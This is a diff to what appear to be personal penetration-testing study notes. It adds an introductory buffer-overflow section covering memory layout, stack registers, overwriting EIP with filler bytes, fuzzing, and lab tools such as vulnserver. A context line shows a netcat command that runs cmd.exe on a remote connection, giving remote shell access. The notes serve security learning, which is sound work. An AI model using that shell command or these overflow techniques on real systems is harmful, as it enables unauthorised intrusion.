@@ -149,5 +149,40 @@ connect
     nc -nv <ip> <port> -e cmd.exe
     -e execute
 
+**Buffer Overflow**
+
+**Basic**
+
+*Overview*
+
+    Kernel      Top         0xffff
+    Stack                               is going down
+    Heap                                is going up
+    Data
+    Text        Button      0000
+
+*Stack*
+
+    ESP (Extended Stack Pointer)                            Top                     
+    Buffer Space                                                                
+    EBP (Extended Base Pointer)                             Base (B for Base)     
+    EIP (Extended instrctuon Pointer) / Return Address                              
+
+Buffer Space goes down. If there an input validation is wrong the EBP and EIP can be reached
+Fill the Buffer Space up with x41 (A) x42 (B)
+
+**Creation**
+
+*Fuzzing*
+
+A programm that is not properly sanitized will crash if it receives to many bytes.
+
+To Download
+
+    vulnserver
+    Immunity Debugger
+
+
+
 
 
